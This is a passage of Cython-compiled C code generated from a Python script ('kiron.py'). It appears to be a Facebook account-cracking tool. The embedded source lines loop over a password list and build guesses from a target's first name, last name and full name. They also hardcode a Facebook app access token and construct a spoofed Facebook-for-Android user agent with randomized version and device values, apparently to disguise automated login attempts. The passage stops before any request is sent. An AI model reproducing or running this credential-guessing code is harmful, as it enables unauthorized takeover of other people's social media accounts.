          __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
          if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 477, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_9);
          __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
        }
        __pyx_t_18 = __Pyx_PyObject_GetAttrStr(__pyx_t_9, __pyx_n_s_replace); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 477, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_18);
        __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
        __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_v_ln, __pyx_n_s_lower); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 477, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __pyx_t_19 = NULL;
        __pyx_t_13 = 0;
        #if CYTHON_UNPACK_METHODS
        if (likely(PyMethod_Check(__pyx_t_6))) {
          __pyx_t_19 = PyMethod_GET_SELF(__pyx_t_6);
          if (likely(__pyx_t_19)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
            __Pyx_INCREF(__pyx_t_19);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_6, function);
            __pyx_t_13 = 1;
          }
        }
        #endif
        {
          PyObject *__pyx_callargs[2] = {__pyx_t_19, NULL};
          __pyx_t_9 = __Pyx_PyObject_FastCall(__pyx_t_6, __pyx_callargs+1-__pyx_t_13, 0+__pyx_t_13);
          __Pyx_XDECREF(__pyx_t_19); __pyx_t_19 = 0;
          if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 477, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_9);
          __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        }
        __pyx_t_6 = NULL;
        __pyx_t_13 = 0;
        #if CYTHON_UNPACK_METHODS
        if (likely(PyMethod_Check(__pyx_t_18))) {
          __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_18);
          if (likely(__pyx_t_6)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_18);
            __Pyx_INCREF(__pyx_t_6);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_18, function);
            __pyx_t_13 = 1;
          }
        }
        #endif
        {
          PyObject *__pyx_callargs[3] = {__pyx_t_6, __pyx_n_s_last, __pyx_t_9};
          __pyx_t_10 = __Pyx_PyObject_FastCall(__pyx_t_18, __pyx_callargs+1-__pyx_t_13, 2+__pyx_t_13);
          __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
          __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
          if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 477, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_10);
          __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
        }
        __pyx_t_18 = __Pyx_PyObject_GetAttrStr(__pyx_t_10, __pyx_n_s_replace); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 477, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_18);
        __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
        __pyx_t_10 = NULL;
        __pyx_t_13 = 0;
        #if CYTHON_UNPACK_METHODS
        if (likely(PyMethod_Check(__pyx_t_18))) {
          __pyx_t_10 = PyMethod_GET_SELF(__pyx_t_18);
          if (likely(__pyx_t_10)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_18);
            __Pyx_INCREF(__pyx_t_10);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_18, function);
            __pyx_t_13 = 1;
          }
        }
        #endif
        {
          PyObject *__pyx_callargs[3] = {__pyx_t_10, __pyx_n_s_Last, __pyx_v_ln};
          __pyx_t_12 = __Pyx_PyObject_FastCall(__pyx_t_18, __pyx_callargs+1-__pyx_t_13, 2+__pyx_t_13);
          __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
          if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 477, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_12);
          __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
        }
        __pyx_t_18 = __Pyx_PyObject_GetAttrStr(__pyx_t_12, __pyx_n_s_replace); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 477, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_18);
        __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
        __pyx_t_12 = NULL;
        __pyx_t_13 = 0;
        #if CYTHON_UNPACK_METHODS
        if (likely(PyMethod_Check(__pyx_t_18))) {
          __pyx_t_12 = PyMethod_GET_SELF(__pyx_t_18);
          if (likely(__pyx_t_12)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_18);
            __Pyx_INCREF(__pyx_t_12);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_18, function);
            __pyx_t_13 = 1;
          }
        }
        #endif
        {
          PyObject *__pyx_callargs[3] = {__pyx_t_12, __pyx_n_s_Name, __pyx_v_names};
          __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_18, __pyx_callargs+1-__pyx_t_13, 2+__pyx_t_13);
          __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
          if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 477, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_4);
          __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
        }
        __pyx_t_18 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_replace); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 477, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_18);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_12 = __Pyx_PyObject_GetAttrStr(__pyx_v_names, __pyx_n_s_lower); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 477, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_12);
        __pyx_t_10 = NULL;
        __pyx_t_13 = 0;
        #if CYTHON_UNPACK_METHODS
        if (likely(PyMethod_Check(__pyx_t_12))) {
          __pyx_t_10 = PyMethod_GET_SELF(__pyx_t_12);
          if (likely(__pyx_t_10)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_12);
            __Pyx_INCREF(__pyx_t_10);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_12, function);
            __pyx_t_13 = 1;
          }
        }
        #endif
        {
          PyObject *__pyx_callargs[2] = {__pyx_t_10, NULL};
          __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_12, __pyx_callargs+1-__pyx_t_13, 0+__pyx_t_13);
          __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
          if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 477, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_4);
          __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
        }
        __pyx_t_12 = NULL;
        __pyx_t_13 = 0;
        #if CYTHON_UNPACK_METHODS
        if (likely(PyMethod_Check(__pyx_t_18))) {
          __pyx_t_12 = PyMethod_GET_SELF(__pyx_t_18);
          if (likely(__pyx_t_12)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_18);
            __Pyx_INCREF(__pyx_t_12);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_18, function);
            __pyx_t_13 = 1;
          }
        }
        #endif
        {
          PyObject *__pyx_callargs[3] = {__pyx_t_12, __pyx_n_s_name, __pyx_t_4};
          __pyx_t_5 = __Pyx_PyObject_FastCall(__pyx_t_18, __pyx_callargs+1-__pyx_t_13, 2+__pyx_t_13);
          __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
          if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 477, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_5);
          __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
        }
        __Pyx_XDECREF_SET(__pyx_v_pas, __pyx_t_5);
        __pyx_t_5 = 0;

        /* "kiron.py":478
 *                 for pw in passlist:
 *                         pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
 *                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'             # <<<<<<<<<<<<<<
 *                         fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
 *                         fbbv = str(random.randint(111111111,999999999))
 */
        __Pyx_INCREF(__pyx_kp_s_350685531728_62f8ce9f74b12f84c12);
        __Pyx_XDECREF_SET(__pyx_v_accessToken, __pyx_kp_s_350685531728_62f8ce9f74b12f84c12);

        /* "kiron.py":479
 *                         pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
 *                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
 *                         fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'             # <<<<<<<<<<<<<<
 *                         fbbv = str(random.randint(111111111,999999999))
 *                         android_version = device['android_version']
 */
        __pyx_t_5 = PyTuple_New(5); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 479, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __pyx_t_22 = 0;
        __pyx_t_8 = 127;
        __Pyx_GetModuleGlobalName(__pyx_t_18, __pyx_n_s_random); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 479, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_18);
        __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_18, __pyx_n_s_randint); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 479, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
        __pyx_t_18 = __Pyx_PyObject_Call(__pyx_t_4, __pyx_tuple__41, NULL); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 479, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_18);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_4 = __Pyx_PyObject_FormatSimple(__pyx_t_18, __pyx_empty_unicode); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 479, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
        __pyx_t_8 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) > __pyx_t_8) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) : __pyx_t_8;
        __pyx_t_22 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_4);
        __Pyx_GIVEREF(__pyx_t_4);
        PyTuple_SET_ITEM(__pyx_t_5, 0, __pyx_t_4);
        __pyx_t_4 = 0;
        __Pyx_INCREF(__pyx_kp_u_0_0);
        __pyx_t_22 += 5;
        __Pyx_GIVEREF(__pyx_kp_u_0_0);
        PyTuple_SET_ITEM(__pyx_t_5, 1, __pyx_kp_u_0_0);
        __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_random); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 479, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_18 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_randint); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 479, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_18);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_4 = __Pyx_PyObject_Call(__pyx_t_18, __pyx_tuple__42, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 479, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
        __pyx_t_18 = __Pyx_PyObject_FormatSimple(__pyx_t_4, __pyx_empty_unicode); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 479, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_18);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_8 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_18) > __pyx_t_8) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_18) : __pyx_t_8;
        __pyx_t_22 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_18);
        __Pyx_GIVEREF(__pyx_t_18);
        PyTuple_SET_ITEM(__pyx_t_5, 2, __pyx_t_18);
        __pyx_t_18 = 0;
        __Pyx_INCREF(__pyx_kp_u__11);
        __pyx_t_22 += 1;
        __Pyx_GIVEREF(__pyx_kp_u__11);
        PyTuple_SET_ITEM(__pyx_t_5, 3, __pyx_kp_u__11);
        __Pyx_GetModuleGlobalName(__pyx_t_18, __pyx_n_s_random); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 479, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_18);
        __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_18, __pyx_n_s_randint); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 479, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
        __pyx_t_18 = __Pyx_PyObject_Call(__pyx_t_4, __pyx_tuple__41, NULL); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 479, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_18);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_4 = __Pyx_PyObject_FormatSimple(__pyx_t_18, __pyx_empty_unicode); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 479, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
        __pyx_t_8 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) > __pyx_t_8) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) : __pyx_t_8;
        __pyx_t_22 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_4);
        __Pyx_GIVEREF(__pyx_t_4);
        PyTuple_SET_ITEM(__pyx_t_5, 4, __pyx_t_4);
        __pyx_t_4 = 0;
        __pyx_t_4 = __Pyx_PyUnicode_Join(__pyx_t_5, 5, __pyx_t_22, __pyx_t_8); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 479, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_XDECREF_SET(__pyx_v_fbav, ((PyObject*)__pyx_t_4));
        __pyx_t_4 = 0;

        /* "kiron.py":480
 *                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
 *                         fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
 *                         fbbv = str(random.randint(111111111,999999999))             # <<<<<<<<<<<<<<
 *                         android_version = device['android_version']
 *                         model = device['model']
 */
        __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_random); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 480, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_randint); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 480, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_4 = __Pyx_PyObject_Call(__pyx_t_5, __pyx_tuple__81, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 480, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = __Pyx_PyObject_Str(__pyx_t_4); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 480, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_XDECREF_SET(__pyx_v_fbbv, __pyx_t_5);
        __pyx_t_5 = 0;

        /* "kiron.py":481
 *                         fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
 *                         fbbv = str(random.randint(111111111,999999999))
 *                         android_version = device['android_version']             # <<<<<<<<<<<<<<
 *                         model = device['model']
 *                         build = device['build']
 */
        __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_device); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 481, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __pyx_t_4 = __Pyx_PyObject_Dict_GetItem(__pyx_t_5, __pyx_n_s_android_version); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 481, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_XDECREF_SET(__pyx_v_android_version, __pyx_t_4);
        __pyx_t_4 = 0;

        /* "kiron.py":482
 *                         fbbv = str(random.randint(111111111,999999999))
 *                         android_version = device['android_version']
 *                         model = device['model']             # <<<<<<<<<<<<<<
 *                         build = device['build']
 *                         fblc = device['fblc']
 */
        __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_device); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 482, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_5 = __Pyx_PyObject_Dict_GetItem(__pyx_t_4, __pyx_n_s_model); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 482, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_XDECREF_SET(__pyx_v_model, __pyx_t_5);
        __pyx_t_5 = 0;

        /* "kiron.py":483
 *                         android_version = device['android_version']
 *                         model = device['model']
 *                         build = device['build']             # <<<<<<<<<<<<<<
 *                         fblc = device['fblc']
 *                         fbcr = sim_id
 */
        __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_device); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 483, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __pyx_t_4 = __Pyx_PyObject_Dict_GetItem(__pyx_t_5, __pyx_n_s_build); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 483, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_XDECREF_SET(__pyx_v_build, __pyx_t_4);
        __pyx_t_4 = 0;

        /* "kiron.py":484
 *                         model = device['model']
 *                         build = device['build']
 *                         fblc = device['fblc']             # <<<<<<<<<<<<<<
 *                         fbcr = sim_id
 *                         fbmf = device['fbmf']
 */
        __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_device); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 484, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_5 = __Pyx_PyObject_Dict_GetItem(__pyx_t_4, __pyx_n_s_fblc); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 484, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_XDECREF_SET(__pyx_v_fblc, __pyx_t_5);
        __pyx_t_5 = 0;

        /* "kiron.py":485
 *                         build = device['build']
 *                         fblc = device['fblc']
 *                         fbcr = sim_id             # <<<<<<<<<<<<<<
 *                         fbmf = device['fbmf']
 *                         fbbd = device['fbbd']
 */
        __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_sim_id); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 485, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_XDECREF_SET(__pyx_v_fbcr, __pyx_t_5);
        __pyx_t_5 = 0;

        /* "kiron.py":486
 *                         fblc = device['fblc']
 *                         fbcr = sim_id
 *                         fbmf = device['fbmf']             # <<<<<<<<<<<<<<
 *                         fbbd = device['fbbd']
 *                         fbdv = device['fbdv']
 */
        __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_device); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 486, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __pyx_t_4 = __Pyx_PyObject_Dict_GetItem(__pyx_t_5, __pyx_n_s_fbmf); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 486, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_XDECREF_SET(__pyx_v_fbmf, __pyx_t_4);
        __pyx_t_4 = 0;

        /* "kiron.py":487
 *                         fbcr = sim_id
 *                         fbmf = device['fbmf']
 *                         fbbd = device['fbbd']             # <<<<<<<<<<<<<<
 *                         fbdv = device['fbdv']
 *                         fbsv = device['fbsv']
 */
        __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_device); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 487, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_5 = __Pyx_PyObject_Dict_GetItem(__pyx_t_4, __pyx_n_s_fbbd); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 487, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_XDECREF_SET(__pyx_v_fbbd, __pyx_t_5);
        __pyx_t_5 = 0;

        /* "kiron.py":488
 *                         fbmf = device['fbmf']
 *                         fbbd = device['fbbd']
 *                         fbdv = device['fbdv']             # <<<<<<<<<<<<<<
 *                         fbsv = device['fbsv']
 *                         fbca = device['fbca']
 */
        __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_device); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 488, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __pyx_t_4 = __Pyx_PyObject_Dict_GetItem(__pyx_t_5, __pyx_n_s_fbdv); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 488, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_XDECREF_SET(__pyx_v_fbdv, __pyx_t_4);
        __pyx_t_4 = 0;

        /* "kiron.py":489
 *                         fbbd = device['fbbd']
 *                         fbdv = device['fbdv']
 *                         fbsv = device['fbsv']             # <<<<<<<<<<<<<<
 *                         fbca = device['fbca']
 *                         fbdm = device['fbdm']
 */
        __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_device); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 489, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_5 = __Pyx_PyObject_Dict_GetItem(__pyx_t_4, __pyx_n_s_fbsv); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 489, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_XDECREF_SET(__pyx_v_fbsv, __pyx_t_5);
        __pyx_t_5 = 0;

        /* "kiron.py":490
 *                         fbdv = device['fbdv']
 *                         fbsv = device['fbsv']
 *                         fbca = device['fbca']             # <<<<<<<<<<<<<<
 *                         fbdm = device['fbdm']
 *                         fbfw = '1'
 */
        __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_device); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 490, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __pyx_t_4 = __Pyx_PyObject_Dict_GetItem(__pyx_t_5, __pyx_n_s_fbca); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 490, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_XDECREF_SET(__pyx_v_fbca, __pyx_t_4);
        __pyx_t_4 = 0;

        /* "kiron.py":491
 *                         fbsv = device['fbsv']
 *                         fbca = device['fbca']
 *                         fbdm = device['fbdm']             # <<<<<<<<<<<<<<
 *                         fbfw = '1'
 *                         fbrv = '0'
 */
        __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_device); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 491, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_5 = __Pyx_PyObject_Dict_GetItem(__pyx_t_4, __pyx_n_s_fbdm); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 491, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_XDECREF_SET(__pyx_v_fbdm, __pyx_t_5);
        __pyx_t_5 = 0;

        /* "kiron.py":492
 *                         fbca = device['fbca']
 *                         fbdm = device['fbdm']
 *                         fbfw = '1'             # <<<<<<<<<<<<<<
 *                         fbrv = '0'
 *                         fban = 'FB4A'
 */
        __Pyx_INCREF(__pyx_kp_s_1);
        __Pyx_XDECREF_SET(__pyx_v_fbfw, __pyx_kp_s_1);

        /* "kiron.py":493
 *                         fbdm = device['fbdm']
 *                         fbfw = '1'
 *                         fbrv = '0'             # <<<<<<<<<<<<<<
 *                         fban = 'FB4A'
 *                         fbpn = 'com.facebook.katana'
 */
        __Pyx_INCREF(__pyx_kp_s_0_2);
        __Pyx_XDECREF_SET(__pyx_v_fbrv, __pyx_kp_s_0_2);

        /* "kiron.py":494
 *                         fbfw = '1'
 *                         fbrv = '0'
 *                         fban = 'FB4A'             # <<<<<<<<<<<<<<
 *                         fbpn = 'com.facebook.katana'
 *                         ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=2.625,width=1080,height=1920};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
 */
        __Pyx_INCREF(__pyx_n_s_FB4A);
        __Pyx_XDECREF_SET(__pyx_v_fban, __pyx_n_s_FB4A);

        /* "kiron.py":495
 *                         fbrv = '0'
 *                         fban = 'FB4A'
 *                         fbpn = 'com.facebook.katana'             # <<<<<<<<<<<<<<
 *                         ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=2.625,width=1080,height=1920};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
 *                         random_seed = random.Random()
 */
        __Pyx_INCREF(__pyx_kp_s_com_facebook_katana);
        __Pyx_XDECREF_SET(__pyx_v_fbpn, __pyx_kp_s_com_facebook_katana);

        /* "kiron.py":496
 *                         fban = 'FB4A'
 *                         fbpn = 'com.facebook.katana'
 *                         ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=2.625,width=1080,height=1920};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'             # <<<<<<<<<<<<<<
 *                         random_seed = random.Random()
 *                         adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
 */
        __pyx_t_5 = PyNumber_Add(__pyx_kp_s_Davik_2_1_0_Linux_U_Android, __pyx_v_android_version); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 496, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __pyx_t_4 = PyNumber_Add(__pyx_t_5, __pyx_kp_s_0_1); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 496, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = PyNumber_Add(__pyx_t_4, __pyx_v_model); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 496, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_4 = PyNumber_Add(__pyx_t_5, __pyx_kp_s_Build); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 496, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
